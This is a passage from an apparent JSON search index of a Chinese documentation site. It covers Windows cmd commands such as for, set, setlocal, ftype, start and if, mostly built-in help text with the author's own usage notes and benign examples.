2.bat 使用 /docs/操作系统/windows/windows_shell/exit 会退出整个程序, 因为, call 是在一个批处理中直接调用另一个批处理, 不会打开新的窗口. 而 start 是新开一个窗口, 所以需要在新开的窗口手动 exit 退出. 要处理call执行子脚本退出父脚本可以使用: goto :eof 来替代, 表示转到文件末尾","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-call.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-call.html"},{"title":"color","text":"设置默认的控制台前景和背景颜色: COLOR [attr] attr 指定控制台输出的颜色属性。 颜色属性由两个十六进制数字指定: 第一个对应于背景 第二个对应于前景 每个数字可以为以下任何值: 0 = 黑色 8 = 灰色 1 = 蓝色 9 = 淡蓝色 2 = 绿色 A = 淡绿色 3 = 浅绿色 B = 淡浅绿色 4 = 红色 C = 淡红色 5 = 紫色 D = 淡紫色 6 = 黄色 E = 淡黄色 7 = 白色 F = 亮白色 如果没有给定任何参数，此命令会将颜色还原到 CMD.EXE 启动时的颜色。 这个值来自当前控制台窗口、/T 命令行开关或 DefaultColor 注册表值。 如果尝试使用相同的前景和背景颜色来执行COLOR 命令，COLOR 命令会将 ERRORLEVEL 设置为 1。 示例: \"COLOR fc\" 在亮白色上产生淡红色","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-coloror.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-coloror.html"},{"title":"dir","text":"显示目录中的文件和子目录列表: DIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N] [/O[[:]sortorder]] [/P] [/Q] [/R] [/S] [/T[[:]timefield]] [/W] [/X] [/4] 选项: [drive:][path][filename] 指定要列出的驱动器、目录和/或文件。 /A 显示具有指定属性的文件。 属性 D 目录 R 只读文件 H 隐藏文件 A 准备存档的文件 S 系统文件 I 无内容索引文件 L 重新分析点 O 脱机文件 - 表示\"否\"的前缀 /B 使用空格式(没有标题信息或摘要)。 /C 在文件大小中显示千位数分隔符。这是默认值。用 /-C 来 禁用分隔符显示。 /D 跟宽式相同，但文件是按栏分类列出的。 /L 用小写。 /N 新的长列表格式，其中文件名在最右边。 /O 用分类顺序列出文件。 排列顺序 N 按名称(字母顺序) S 按大小(从小到大) E 按扩展名(字母顺序) D 按日期/时间(从先到后) G 组目录优先 - 反转顺序的前缀 /P 在每个信息屏幕后暂停。 /Q 显示文件所有者。 /R 显示文件的备用数据流。 /S 显示指定目录和所有子目录中的文件。 /T 控制显示或用来分类的时间字符域 时间段 C 创建时间 A 上次访问时间 W 上次写入的时间 /W 用宽列表格式。 /X 显示为非 8dot3 文件名产生的短名称。格式是 /N 的格式， 短名称插在长名称前面。如果没有短名称，在其位置则 显示空白。 /4 以四位数字显示年份 可以在 DIRCMD 环境变量中预先设定开关。通过添加前缀 - (破折号) 来替代预先设定的开关。例如，/-W。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-dir.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-dir.html"},{"title":"exit","text":"可以查帮助文档: exit /? 退出CMD.EXE程序或者当前解释器 EXIT [/B] [exitCode] /B 指定要退出当前批处理脚本而不是 CMD.EXE。如果从一个 批处理脚本外执行，则会退出 CMD.EXE exitCode 指定一个数字号码。如果指定了 /B，将 ERRORLEVEL 设成那个数字。如果退出 CMD.EXE，则用那个数字设置 过程退出代码。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-exit.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-exit.html"},{"title":"find","text":"在文件中搜索字符串: FIND [/V] [/C] [/N] [/I] [/OFF[LINE]] \"string\" [[drive:][path]filename[ ...]] 选项: /V 显示所有未包含指定字符串的行。 /C 仅显示包含字符串的行数。 /N 显示行号。 /I 搜索字符串时忽略大小写。 /OFF[LINE] 不要跳过具有脱机属性集的文件。 \"string\" 指定要搜索的文本字符串。 [drive:][path]filename 指定要搜索的文件。 如果没有指定路径，FIND 将搜索在提示符处键入 的文本或者由另一命令产生的文本。 但是实际使用, 感觉 dir | find /c /v 更像是打印所有行 统计行数, 比如查找的python进程的个数: tasklist | findstr /I \"python\" | find /c /v \"\"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-find.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-find.html"},{"title":"for","text":"循环: C:\\Users\\烟雀>for /? 对一组文件中的每一个文件执行某个特定命令: FOR %variable IN (set) DO command [command-parameters] %variable 指定一个单一字母可替换的参数。 (set) 指定一个或一组文件。可以使用通配符。 command 指定对每个文件执行的命令。 command-parameters 为特定命令指定参数或命令行开关。 在批处理程序中使用 FOR 命令时，指定变量请使用 %%variable 而不要用 %variable。变量名称是区分大小写的，所以 %i 不同于 %I. 如果启用命令扩展，则会支持下列 FOR 命令的其他格式: FOR /D %variable IN (set) DO command [command-parameters] 如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。 FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters] 检查以 [drive:]path 为根的目录树，指向每个目录中的 FOR 语句。 如果在 /R 后没有指定目录规范，则使用当前目录。如果集仅为一个单点(.)字符， 则枚举该目录树。 FOR /L %variable IN (start,step,end) DO command [command-parameters] 该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5)将产生序列 1 2 3 4 5，(5,-1,1)将产生序列(5 4 3 2 1) FOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters] FOR /F [\"options\"] %variable IN (\"string\") DO command [command-parameters] FOR /F [\"options\"] %variable IN ('command') DO command [command-parameters] 或者，如果有 usebackq 选项: FOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters] FOR /F [\"options\"] %variable IN (\"string\") DO command [command-parameters] FOR /F [\"options\"] %variable IN ('command') DO command [command-parameters] 简而言之就是表示表示寻找文件 fileset 为一个或多个文件名。继续到 fileset 中的下一个文件之前， 每份文件都被打开、读取并经过处理。处理包括读取文件，将其分成一行行的文字， 然后将每行解析成零或更多的符号。然后用已找到的符号字符串变量值调用 For 循环。 以默认方式，/F 通过每个文件的每一行中分开的第一个空白符号。跳过空白行。 你可通过指定可选 \"options\" 参数替代默认解析操作。这个带引号的字符串包括一个 或多个指定不同解析选项的关键字。这些关键字为: eol=c - 指一个行注释字符的结尾(就一个) skip=n - 指在文件开始时忽略的行数。 delims=xxx - 指分隔符集。这个替换了空格和制表符的 默认分隔符集。 tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代 的 for 本身。这会导致额外变量名称的分配。m-n 格式为一个范围。通过 nth 符号指定 mth。如果 符号字符串中的最后一个字符星号， 那么额外的变量将在最后一个符号解析之后 分配并接受行的保留文本。 usebackq - 指定新语法已在下类情况中使用: 在作为命令执行一个后引号的字符串并且一个单 引号字符为文字字符串命令并允许在 file-set 中使用双引号扩起文件名称。 某些范例可能有助: FOR /F \"eol=; tokens=2,3* delims=, \" %i in (myfile.txt) do @echo %i %j %k 会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将 每行中的第二个和第三个符号传递给 for 函数体，用逗号和/或 空格分隔符号。请注意，此 for 函数体的语句引用 %i 来 获得第二个符号，引用 %j 来获得第三个符号，引用 %k 来获得第三个符号后的所有剩余符号。对于带有空格的文件 名，你需要用双引号将文件名括起来。为了用这种方式来使 用双引号，还需要使用 usebackq 选项，否则，双引号会 被理解成是用作定义某个要分析的字符串的。 %i 在 for 语句中显式声明，%j 和 %k 是通过 tokens= 选项隐式声明的。可以通过 tokens= 一行 指定最多 26 个符号，只要不试图声明一个高于字母 \"z\" 或 \"Z\" 的变量。请记住，FOR 变量是单一字母、分大小写和全局的变量； 而且，不能同时使用超过 52 个。 还可以在相邻字符串上使用 FOR /F 分析逻辑，方法是， 用单引号将括号之间的 file-set 括起来。这样，该字符 串会被当作一个文件中的一个单一输入行进行解析。 最后，可以用 FOR /F 命令来分析命令的输出。方法是，将 括号之间的 file-set 变成一个反括字符串。该字符串会 被当作命令行，传递到一个子 CMD.EXE，其输出会被捕获到 内存中，并被当作文件分析。如以下例子所示: FOR /F \"usebackq delims==\" %i IN (`set`) DO @echo %i 会枚举当前环境中的环境变量名称。 另外，FOR 变量参照的替换已被增强。你现在可以使用下列 选项语法: %~I - 删除任何引号(\")，扩展 %I %~fI - 将 %I 扩展到一个完全合格的路径名 %~dI - 仅将 %I 扩展到一个驱动器号 %~pI - 仅将 %I 扩展到一个路径 %~nI - 仅将 %I 扩展到一个文件名 %~xI - 仅将 %I 扩展到一个文件扩展名 %~sI - 扩展的路径只含有短名 %~aI - 将 %I 扩展到文件的文件属性 %~tI - 将 %I 扩展到文件的日期/时间 %~zI - 将 %I 扩展到文件的大小 %~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩展 到找到的第一个完全合格的名称。如果环境变量名 未被定义，或者没有找到文件，此组合键会扩展到 空字符串 可以组合修饰符来得到多重结果: %~dpI - 仅将 %I 扩展到一个驱动器号和路径 %~nxI - 仅将 %I 扩展到一个文件名和扩展名 %~fsI - 仅将 %I 扩展到一个带有短名的完整路径名 %~dp$PATH:I - 搜索列在路径环境变量的目录，并将 %I 扩展 到找到的第一个驱动器号和路径。 %~ftzaI - 将 %I 扩展到类似输出线路的 DIR 在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法 用一个有效的 FOR 变量名终止。选取类似 %I 的大写变量名 比较易读，而且避免与不分大小写的组合键混淆。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-for.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-for.html"},{"title":"ftype","text":"显示或修改用在文件扩展名关联中的文件类型: FTYPE [fileType[=[openCommandString]]] fileType 指定要检查或改变的文件类型 openCommandString 指定调用这类文件时要使用的开放式命令。 键入 FTYPE 而不带参数来显示当前有定义的开放式命令字符串的文件类型。 FTYPE 仅用一个文件类型启用时，它显示那个文件类型目前的开放式命令字符串。 如果不为开放式命令字符串指定，FTYPE 命令将删除那个文件类型的开放式命令字符串。 在一个开放式命令字符串之内，命令字符串 %0 或 %1 被通过关联调用的文件名所代替。 %* 得到所有的参数， %2 得到第一个参数， %3 得到第二个，等等。 %~n 得到其余所有以 nth 参数打头的参数； n 可以是从 2 到 9 的数字。例如: ASSOC .pl=PerlScript FTYPE PerlScript=perl.exe %1 %* 允许你启用以下 Perl 脚本: script.pl 1 2 3 如果不想键入扩展名，则键入以下字符串: set PATHEXT=.pl;%PATHEXT% 被启动的脚本如下: script 1 2 3 注解 ftype 设置 设置文件类型关联, 关联到'执行程序和参数' 与 /docs/操作系统/windows/windows_shell/assoc 文件扩展名关联, 关联到'文件类型' 类似 说明: 当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开 而是先判断.txt属于 txtfile '文件类型' 再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1 可以在\"文件夹选项\"→\"文件类型\"里修改这2种关联: assoc #显示所有'文件扩展名'关联 assoc .txt #显示.txt代表的'文件类型'，结果显示 .txt=txtfile assoc .doc #显示.doc代表的'文件类型'，结果显示 .doc=Word.Document.8 assoc .exe #显示.exe代表的'文件类型'，结果显示 .exe=exefile ftype #显示所有'文件类型'关联 ftype exefile #显示exefile类型关联的命令行，结果显示 exefile=\"%1\" %* assoc .txt=Word.Document.8 设置.txt为word类型的文档，可以看到.txt文件的图标都变了: assoc .txt=txtfile 恢复.txt的正确关联: ftype exefile=\"%1\" %* 恢复 exefile 的正确关联 如果该关联已经被破坏，可以运行 command.com ，再输入这条命令","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ftype.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ftype.html"},{"title":"if","text":"执行批处理程序中的条件处理: IF [NOT] ERRORLEVEL number command IF [NOT] string1==string2 command IF [NOT] EXIST filename command NOT 指定只有条件为 false 的情况下，Windows 才 应该执行该命令。 ERRORLEVEL number 如果最后运行的程序返回一个等于或大于 指定数字的退出代码，指定条件为 true。 string1==string2 如果指定的文字字符串匹配，指定条件为 true。 EXIST filename 如果指定的文件名存在，指定条件为 true。 command 如果符合条件，指定要执行的命令。如果指定的 条件为 FALSE，命令后可跟 ELSE 命令，该命令将 在 ELSE 关键字之后执行该命令。 ELSE 子句必须出现在同一行上的 IF 之后。例如: IF EXIST filename. ( del filename. ) ELSE ( echo filename. missing. ) 由于 del 命令需要用新的一行终止，因此以下子句不会有效: IF EXIST filename. del filename. ELSE echo filename. missing 由于 ELSE 命令必须与 IF 命令的尾端在同一行上，以下子句也不会有效: IF EXIST filename. del filename. ELSE echo filename. missing 如果都放在同一行上，以下子句有效: IF EXIST filename. (del filename.) ELSE echo filename. missing 如果命令扩展被启用，IF 会如下改变: IF [/I] string1 compare-op string2 command IF CMDEXTVERSION number command IF DEFINED variable command 其中， compare-op 可以是: EQU - 等于 NEQ - 不等于 LSS - 小于 LEQ - 小于或等于 GTR - 大于 GEQ - 大于或等于 而 /I 开关(如果指定)说明要进行的字符串比较不分大小写。 /I 开关可以用于 IF 的 string1==string2 的形式上。 这些比较都是通用的； 原因是，如果 string1 和 string2 都是由数字组成的，字符串会被转换成数字，进行数字比较。 CMDEXTVERSION 条件的作用跟 ERRORLEVEL 的一样，除了它是在跟与命令扩展有关联的内部版本号比较。 第一个版本是 1。 每次对命令扩展有相当大的增强时，版本号会增加一个。 命令扩展被停用时，CMDEXTVERSION 条件不是真的。 如果已定义环境变量，DEFINED 条件的作用跟 EXIST 的一样，除了它取得一个环境变量，返回的结果是 true。 如果没有名为 ERRORLEVEL 的环境变量，%ERRORLEVEL% 会扩充为 ERROLEVEL 当前数值的字符串表达式； 否则，你会得到其数值。 运行程序后，以下语句说明 ERRORLEVEL 的用法: goto answer%ERRORLEVEL% :answer0 echo Program had return code 0 :answer1 echo Program had return code 1 你也可以使用以上的数字比较: IF %ERRORLEVEL% LEQ 1 goto okay 如果没有名为 CMDCMDLINE 的环境变量，%CMDCMDLINE% 将在 CMD.EXE 进行任何处理前扩充为传递给 CMD.EXE 的原始 命令行；否则，你会得到其数值。 如果没有名为 CMDEXTVERSION 的环境变量， %CMDEXTVERSION% 会扩充为 CMDEXTVERSION 当前数值的 字串符表达式；否则，你会得到其数值。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-if.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-if.html"},{"title":"mklink","text":"创建符号链接。 使用: MKLINK [[/D] | [/H] | [/J]] Link Target /D 创建目录符号链接。默认为文件符号链接。 /H 创建硬链接而非符号链接。 /J 创建目录联接。 Link 指定新的符号链接名称。 其实应该叫target， 链接到的地址 Target 指定新链接引用的路径。 其实应该叫source， 真实源地址 (相对或绝对)。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mklink.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mklink.html"},{"title":"mode","text":"配置系统设备。 串行端口: MODE COMm[:] [BAUD=b] [PARITY=p] [DATA=d] [STOP=s] [to=on|off] [xon=on|off] [odsr=on|off] [octs=on|off] [dtr=on|off|hs] [rts=on|off|hs|tg] [idsr=on|off] 设备状态: MODE [device] [/STATUS] 打印重定向: MODE LPTn[:]=COMm[:] 选择代码页: MODE CON[:] CP SELECT=yyy 代码页状态: MODE CON[:] CP [/STATUS] 显示模式: MODE CON[:] [COLS=c] [LINES=n] 击键率: MODE CON[:] [RATE=r DELAY=d] 例: mode con cols=113 lines=15 & color 9f 此命令设置DOS窗口大小：15行，113列","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mode.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mode.html"},{"title":"move","text":"移动文件并重命名文件和目录。 要移动至少一个文件: MOVE [/Y | /-Y] [drive:][path]filename1[,...] destination 要重命名一个目录: MOVE [/Y | /-Y] [drive:][path]dirname1 dirname2 [drive:][path]filename1 指定你想移动的文件位置和名称。 destination 指定文件的新位置。目标可包含一个驱动器号 和冒号、一个目录名或组合。如果只移动一个文件 并在移动时将其重命名，你还可以包括文件名。 [drive:][path]dirname1 指定要重命名的目录。 dirname2 指定目录的新名称。 /Y 取消确认覆盖一个现有目标文件的提示。 /-Y 对确认覆盖一个现有目标文件发出提示。 命令行开关 /Y 可以出现在 COPYCMD 环境变量中。 这可以用命令行上的 /-Y 替代。 默认值是，除非 MOVE 命令是从一个批脚本内执行的，覆盖时都发出提示。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-move.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-move.html"},{"title":"pause","text":"暂停脚本, 可用于debug","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pause.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pause.html"},{"title":"pushd","text":"保存当前目录以供 POPD 命令: /docs/操作系统/windows/windows_shell/popd 使用，然后改到指定的目录: PUSHD [path | ..] path 指定要成为当前目录的目录。 如果命令扩展被启用，除了一般驱动器号和路径，PUSHD命令还接受网络路径。 如果指定了网络路径，PUSHD 将创建一个指向指定网络资源的临时驱动器号，然后再用刚定义的驱动器号更改当前的驱动器和目录。 可以从 Z: 往下分配临时驱动器号，使用找到的第一个没有用过的驱动器号。 例如: @echo off c: & cd\\ & md mp3 #在 C:\\ 建立 mp3 文件夹 md d:\\mp4 #在 D:\\ 建立 mp4 文件夹 cd /d d:\\mp4 #更改当前目录为 d:\\mp4 pushd c:\\mp3 #保存当前目录，并切换当前目录为 c:\\mp3 popd #恢复当前目录为刚才保存的 d:\\mp4","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pushd.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pushd.html"},{"title":"set","text":"用于设置变量 显示、设置或删除 cmd.exe 环境变量。 语法: SET [variable=[string]] variable 指定环境变量名。 string 指定要指派给变量的一系列字符串。 注解 string 中引号也被视作变量的一部分 set设置的变量, =左右不能有空格. 显示当前环境变量 要 显示当前环境变量 ，键入不带参数的 SET: set 如果命令扩展被启用，SET 会如下改变: 查找当前环境变量 可仅用一个变量激活 SET 命令，等号或值不显示所有前缀匹配 SET 命令已使用的名称的所有变量的值。 例如: SET P 会显示所有以字母 P 打头的变量 如果在当前环境中找不到该变量名称，SET 命令将把 ERRORLEVEL 设置成 1。 注解 SET 命令不允许变量名含有等号。 命令行开关 在 SET 命令中添加了两个新命令行开关: SET /A expression SET /P variable=[promptString] /A 命令行开关指定等号右边的字符串为被评估的数字表达式。该表达式评估器很简单并以递减的优先权顺序支持下列操作: () - 分组 ! ~ - - 一元运算符 * / % - 算数运算符 + - - 算数运算符 << >> - 逻辑移位 & - 按位\"与\" &#94; - 按位\"异\" | - 按位\"或\" = *= /= %= += -= - 赋值 &= &#94;= |= <<= >>= , - 表达式分隔符 如果你使用任何逻辑或取余操作符， 你需要将表达式字符串用引号扩起来。 在表达式中的任何非数字字符串键作为环境变量名称，这些环境变量名称的值已在使用前转换成数字。 如果指定了一个环境变量名称，但未在当前环境中定义，那么值将被定为零。 这使你可以使用环境变量值做计算而不用键入那些 % 符号来得到它们的值。 如果 SET /A 在命令脚本外的命令行执行的，那么它显示该表达式的最后值。 该分配的操作符在分配的操作符左边需要一个环境变量名称。 除十六进制有 0x 前缀，八进制有 0 前缀的，数字值为十进位数字。 因此，0x12 与 18 和 022相同。请注意八进制公式可能很容易搞混: 08 和 09 是无效的数字， 因为 8 和 9 不是有效的八进制位数。(& ) /P 命令行开关允许将变量数值设成用户输入的一行输入。读取输入 行之前，显示指定的 promptString。promptString 可以是空的。 变量局部替换及其他 字符串替换 环境变量替换(即字符串替换)已如下增强: %PATH:str1=str2% 会扩展 PATH 环境变量，用 \"str2\" 代替扩展结果中的每个 \"str1\"。 要有效地从扩展结果中删除所有的 \"str1\"，\"str2\" 可以是空的。 \"str1\" 可以以星号打头；在这种情况下，\"str1\" 会从扩展结果的开始到 str1 剩余部分第一次出现的地方，都一直保持相配。 字符串提取 也可以为扩展名指定子字符串(即提取字符串): %PATH:~10,5% 会扩展 PATH 环境变量，然后只使用在扩展结果中从第 11 个(偏移量 10)字符开始的五个字符。 如果没有指定长度，则采用默认值，即变量数值的余数。 如果两个数字(偏移量和长度)都是负数，使用的数字则是环境变量数值长度加上指定的偏移量或长度. 提取 PATH 变量的最后十个字符: %PATH:~-10% 提取 PATH 变量的所有字符，除了最后两个: %PATH:~0,-2% 延迟环境变量拓展相关 如何添加? setlocal ENABLEDELAYEDEXPANSION 然后后面变量加感叹号即可. 详情见: /docs/操作系统/windows/windows_shell/setlocal 延迟环境变量扩充的支持。该支持总是按默认值被停用，但也可以通过 CMD.EXE 的 /V 命令行开关而被启用/停用。请参阅 CMD /? 考虑到读取一行文本时所遇到的目前扩充的限制时，延迟环境变量扩充是很有用的，而不是执行的时候。 以下例子说明直接变量扩充的问题: set VAR=before if \"%VAR%\" == \"before\" ( set VAR=after if \"%VAR%\" == \"after\" @echo If you see this, it worked ) 不会显示消息，因为 %VAR% 的值会被预先替换掉. 即: C:\\Users\\烟雀\\Desktop\\some\\t\\_>3.bat set VAR=before if \"before\" == \"before\" ( set VAR=after if \"before\" == \"after\" ) 因为在 '预编译'(对这个不熟, 暂且这样定义)时候，两个 if 语句中的 %VAR% 会被代替； 因为 最外部的 if 是一个复合语句, 所以，复合语句中的 if(第二个if) 实际上是在比较 \"before\"和\"after\"，这两者永远不会相等。 同样，以下这个例子也不会达到预期效果: set LIST= for% i in (*) do set LIST=%LIST%%i echo%LIST% 原因是，它不会在目前的目录中建立一个文件列表，而只是将LIST 变量设成找到的最后一个文件。 这也是因为 %LIST% 在 FOR 语句被读取时，只被扩充了一次； 而且，那时的 LIST 变量是空的。 因此，我们真正执行的 FOR 循环是: for% i in (*) do set LIST= %i 这个循环继续将 LIST 设成找到的最后一个文件。 延迟环境变量扩充允许你使用一个不同的字符(惊叹号)在执行时间扩充环境变量。 如果延迟的变量扩充被启用，可以将上面例子写成以下所示，以达到预期效果: set VAR=before if \"%VAR%\" == \"before\" ( set VAR=after if \"!VAR!\" == \"after\" @echo If you see this, it worked ) set LIST= for% i in (*) do set LIST=!LIST! %i echo %LIST% 如果命令扩展被启用，有几个动态环境变量可以被扩展，但不会出现在 SET 显示的变 量列表中。每次变量数值被扩展时，这些变量数值都会被动态计算。如果用户用这些 名称中任何一个明确定义变量，那个定义会替代下面描述的动态定义: %CD% - 扩展到当前目录字符串。 %DATE% - 用跟 DATE 命令同样的格式扩展到当前日期。 %TIME% - 用跟 TIME 命令同样的格式扩展到当前时间。 %RANDOM% - 扩展到 0 和 32767 之间的任意十进制数字。 %ERRORLEVEL% - 扩展到当前 ERRORLEVEL 数值。 %CMDEXTVERSION% - 扩展到当前命令处理器扩展版本号。 %CMDCMDLINE% - 扩展到调用命令处理器的原始命令行。 %HIGHESTNUMANODENUMBER% - 扩展到此计算机上的最高 NUMA 节点号。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-set.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-set.html"},{"title":"setlocal","text":"开始批处理文件中环境改动的本地化操作。在执行 SETLOCAL 之后所做的环境改动只限于批处理文件。 要还原原先的设置，必须执行 ENDLOCAL。 达到批处理文件结尾时，对于该批处理文件的每个尚未执行的 SETLOCAL 命令，都会有一个隐含的 ENDLOCAL 被执行。 SETLOCAL 如果启用命令扩展，则 SETLOCAL 更改如下: SETLOCAL 批命令现在可以接受可选参数: ENABLEEXTENSIONS / DISABLEEXTENSIONS 启用或禁用命令处理器扩展。这些 参数比 CMD /E:ON 或 /E:OFF 开关有优先权。请参阅 CMD /? 获取详细信息。 ENABLEDELAYEDEXPANSION / DISABLEDELAYEDEXPANSION 启用或禁用延缓环境变量 扩展。这些参数比 CMD /V:ON 或 /V:OFF 开关有优先权。请参阅 CMD /? 获取详细信息。 无论在 SETLOCAL 命令之前的设置是什么，这些修改会一直 生效，直到出现相应的 ENDLOCAL 命令。 在给定参数的情况下， SETLOCAL 命令将设置 ERRORLEVEL 值。如果给定两个有效参数中的一个，另一个未给定， 则该值为零。 通过以下方法，你可以在批脚本中 使用此项来确定扩展是否可用: VERIFY OTHER 2>nul SETLOCAL ENABLEEXTENSIONS IF ERRORLEVEL 1 echo Unable to enable extensions 此方法之所以有效，是因为在 CMD.EXE 的旧版本上，SETLOCAL 不设置 ERRORLEVEL 值。如果参数不正确，VERIFY 命令会将 ERRORLEVEL 值初始化为非零值。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-setlocal.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-setlocal.html"},{"title":"shift","text":"更改批处理文件中可替换参数的位置: SHIFT [/n] 如果命令扩展被启用，SHIFT 命令支持/n 命令行开关；该命令行开关告诉命令从第 n 个参数开始移位； n 介于零和八之间。例如: SHIFT /2 会将 %3 移位到 %2，将 %4 移位到 %3，等等；并且不影响 %0 和 %1。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-shift.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-shift.html"},{"title":"start","text":"启动一个单独的窗口以运行指定的程序或命令: START [\"title\"] [/D path] [/I] [/MIN] [/MAX] [/SEPARATE | /SHARED] [/LOW | /NORMAL | /HIGH | /REALTIME | /ABOVENORMAL | /BELOWNORMAL] [/NODE <NUMA node>] [/AFFINITY <hex affinity mask>] [/WAIT] [/B] [command/program] [parameters] 选项/参数说明: \"title\" 在窗口标题栏中显示的标题。 path 启动目录。 B 启动应用程序，但不创建新窗口。 应用程序已忽略 &#94;C 处理。除非应用程序 启用 &#94;C 处理，否则 &#94;Break 是唯一可以中断 该应用程序的方式。 I 新的环境将是传递 给 cmd.exe 的原始环境，而不是当前环境。 MIN 以最小化方式启动窗口。 MAX 以最大化方式启动窗口。 SEPARATE 在单独的内存空间中启动 16 位 Windows 程序。 SHARED 在共享内存空间中启动 16 位 Windows 程序。 LOW 在 IDLE 优先级类中启动应用程序。 NORMAL 在 NORMAL 优先级类中启动应用程序。 HIGH 在 HIGH 优先级类中启动应用程序。 REALTIME 在 REALTIME 优先级类中启动应用程序。 ABOVENORMAL 在 ABOVENORMAL 优先级类中启动应用程序。 BELOWNORMAL 在 BELOWNORMAL 优先级类中启动应用程序。 NODE 将首选非一致性内存结构(NUMA)节点指定为 十进制整数。 AFFINITY 将处理器关联掩码指定为十六进制数字。 进程被限制在这些处理器上运行。 将 /AFFINITY 和 /NODE 结合使用时，会对关联掩码 进行不同的解释。指定关联掩码，以便将零位作为起始位置(就如将 NUMA 节点的处理器掩码向右移位一样)。 进程被限制在指定关联掩码和 NUMA 节点之间的 那些通用处理器上运行。 如果没有通用处理器，则进程被限制在 指定的 NUMA 节点上运行。 WAIT 启动应用程序并等待它终止。 command/program 如果它是内部 cmd 命令或批文件，则 该命令处理器是使用 cmd.exe 的 /K 开关运行的。 这表示运行该命令之后，该窗口 将仍然存在。 如果它不是内部 cmd 命令或批文件，则 它就是一个程序，并将作为一个窗口化应用程序或 控制台应用程序运行。 parameters 这些是传递给 command/program 的参数。 注意: 在 64 位平台上不支持 SEPARATE 和 SHARED 选项。 通过指定 /NODE，可按照利用 NUMA 系统中的内存区域的方式创建进程。 例如，可以创建两个完全通过共享内存互相通信的进程以共享相同的首选 NUMA 节点，从而最大限度地减少内存延迟。 只要有可能，它们就会分配来自相同 NUMA 节点的内存，并且会在指定节点之外的处理器上自由运行: start /NODE 1 application1.exe start /NODE 1 application2.exe 这两个进程可被进一步限制在相同 NUMA 节点内的指定处理器上运行。 在以下示例中，application1 在节点的两个低位处理器上运行，而 application2在该节点的其后两个处理器上运行。 该示例假定指定节点至少具有四个逻辑处理器。请注意，节点号可更改为该计算机的任何有效节点号，而无需更改关联掩码: start /NODE 1 /AFFINITY 0x3 application1.exe start /NODE 1 /AFFINITY 0xc application2.exe 如果命令扩展被启用，通过命令行或 START 命令的外部命令调用会如下改变: 将文件名作为命令键入，非可执行文件可以通过文件关联调用。 (例如，WORD.DOC 会调用跟 .DOC 文件扩展名关联的应用程序)。 关于如何从命令脚本内部创建这些关联，请参阅 ASSOC 和 FTYPE 命令。 执行的应用程序是 32 位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示符。 如果在命令脚本内执行，该新行为则不会发生。 如果执行的命令行的第一个符号是不带扩展名或路径修饰符的字符串 \"CMD\"，\"CMD\" 会被 COMSPEC 变量的数值所替换。 这防止从当前目录提取 CMD.EXE。 如果执行的命令行的第一个符号没有扩展名，CMD.EXE 会使用PATHEXT 环境变量的数值来决定要以什么顺序寻找哪些扩展名。 PATHEXT 变量的默认值是: .COM;.EXE;.BAT;.CMD 请注意，该语法跟 PATH 变量的一样，分号隔开不同的元素。 查找可执行文件时，如果没有相配的扩展名，看一看该名称是否与目录名相配。 如果确实如此，START 会在那个路径上调用Explorer。 如果从命令行执行，则等同于对那个路径作 CD /D。 批处理中调用外部程序的命令（该外部程序在新窗口中运行，批处理程序继续往下执行，不理会外部程序的运行状况）， 如果直接运行外部程序则必须等外部程序完成后才继续执行剩下的指令 例: start explorer d:\\ 调用图形界面打开D盘 有一类似指令 call 与区别, 见 /docs/操作系统/windows/windows_shell/call 注意: 有时候使用 start 启动时候无效: start \"C:\\user xx\\xx.bat\" 是因为有个 title 参数, 这时候加个空标题即可: start \"\" \"C:\\user xx\\xx.bat\"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-start.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-start.html"},{"title":"taskkill","text":"类似 linux 的 kill 使用该工具按照进程 ID (PID) 或映像名称终止任务: TASKKILL [/S 